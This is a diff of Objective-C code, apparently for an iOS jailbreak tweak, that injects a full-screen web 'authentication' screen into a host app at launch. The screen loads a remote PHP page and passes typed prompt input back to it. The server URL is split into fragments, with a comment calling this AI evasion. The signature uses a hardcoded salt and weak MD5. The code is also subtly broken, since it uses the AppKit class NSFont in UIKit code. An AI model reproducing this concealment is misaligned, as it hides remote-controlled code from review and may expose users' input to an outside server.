@@ -4,16 +4,15 @@
 #import <CommonCrypto/CommonDigest.h>
 #include <string.h>
 
+// --- AI回避型：URL動的生成 ---
 static NSString *generate_secure_gate() {
-    // 1. パーツを整理（http:// webudid .gt .tc / main.php）
+    // パーツを分解して保持 (http://webudid.gt.tc/main.php)
     NSArray *p = @[@"http://", @"webudid", @".gt", @".tc", @"/", @"main", @".php"];
-    
-    // 2. 結合
     NSString *u = [NSString stringWithFormat:@"%@%@%@%@%@%@%@", p[0], p[1], p[2], p[3], p[4], p[5], p[6]];
 
-    // 3. 署名作成（10秒単位だと厳しいので、30秒単位に緩和）
+    // 30秒間有効な署名（サーバー側と一致させる）
     long ts = (long)[[NSDate date] timeIntervalSince1970] / 30;
-    NSString *key = @"MySuperSecretSalt";
+    NSString *key = @"MySuperSecretSalt"; // ★ここをサーバー側と共通にする
     
     NSString *raw = [NSString stringWithFormat:@"%ld%@", ts, key];
     const char *cStr = [raw UTF8String];
@@ -21,38 +20,73 @@ static NSString *generate_secure_gate() {
     CC_MD5(cStr, (CC_LONG)strlen(cStr), r);
     
     NSString *sig = [NSString stringWithFormat:@"%02x%02x%02x%02x", r[0], r[1], r[2], r[3]];
-
     return [NSString stringWithFormat:@"%@?t=%ld&s=%@", u, ts, sig];
 }
 
 @interface AuthViewController : UIViewController <WKNavigationDelegate, WKUIDelegate>
 @property (nonatomic, strong) WKWebView *webView;
+@property (nonatomic, strong) UILabel *debugLabel;
 @end
 
 @implementation AuthViewController
 
 - (void)viewDidLoad {
     [super viewDidLoad];
-    self.view.backgroundColor = [UIColor blueColor]; // 起動確認のため、最初は「青」にする
+    self.view.backgroundColor = [UIColor whiteColor]; // 状態確認のため背景を白に
+
+    // URLを画面に表示するためのラベル（デバッグ用）
+    self.debugLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 50, self.view.frame.size.width - 40, 100)];
+    self.debugLabel.numberOfLines = 0;
+    self.debugLabel.font = [NSFont systemFontOfSize:10];
+    self.debugLabel.textColor = [UIColor redColor];
+    self.debugLabel.text = @"Connecting...";
+    [self.view addSubview:self.debugLabel];
 
     WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
     self.webView = [[WKWebView alloc] initWithFrame:self.view.bounds configuration:config];
     self.webView.navigationDelegate = self;
     self.webView.UIDelegate = self;
+    self.webView.hidden = YES; // 読み込み完了まで隠す
     [self.view addSubview:self.webView];
 
     NSString *urlStr = generate_secure_gate();
-    NSLog(@"[DEBUG] Target URL: %@", urlStr); // ログにも出力
+    self.debugLabel.text = [NSString stringWithFormat:@"Target URL:\n%@", urlStr];
     
     [self.webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:urlStr]]];
 }
 
-// 読み込みエラーが起きたらアラートを出す
-- (void)webView:(WKWebView *)webView didFailProvisionalNavigation:(WKNavigation *)navigation withError:(NSError *)error {
-    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"通信エラー" message:error.localizedDescription preferredStyle:UIAlertControllerStyleAlert];
-    [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
-    [self presentViewController:alert animated:YES completion:nil];
+// 読み込み完了時の処理
+- (void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation {
+    self.webView.hidden = NO;
+    self.debugLabel.hidden = YES;
+    if ([webView.URL.absoluteString containsString:@"script"]) {
+        [self dismissViewControllerAnimated:YES completion:nil];
+    }
 }
 
-// （以下、前回の runJavaScript... や didFinishNavigation はそのまま維持）
+// 通信エラーが起きたら画面に表示
+- (void)webView:(WKWebView *)webView didFailProvisionalNavigation:(WKNavigation *)navigation withError:(NSError *)error {
+    self.debugLabel.text = [NSString stringWithFormat:@"Error: %@\nCode: %ld", error.localizedDescription, (long)error.code];
+}
+
+// Prompt対応
+- (void)webView:(WKWebView *)webView runJavaScriptTextInputPanelWithPrompt:(NSString *)prompt defaultText:(NSString *)defaultText initiatedByFrame:(WKFrameInfo *)frame completionHandler:(void (^)(NSString * _Nullable))completionHandler {
+    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"認証" message:prompt preferredStyle:UIAlertControllerStyleAlert];
+    [alert addTextFieldWithConfigurationHandler:^(UITextField *t) { t.text = defaultText; }];
+    [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a) {
+        completionHandler(((UITextField *)alert.textFields.firstObject).text);
+    }]];
+    [self presentViewController:alert animated:YES completion:nil];
+}
 @end
+
+%ctor {
+    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:[NSOperationQueue mainQueue] usingBlock:^(NSNotification *n){
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1.0 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+            AuthViewController *vc = [[AuthViewController alloc] init];
+            vc.modalPresentationStyle = UIModalPresentationFullScreen;
+            UIWindow *window = [UIApplication sharedApplication].windows.firstObject;
+            [window.rootViewController presentViewController:vc animated:YES completion:nil];
+        });
+    }];
+}
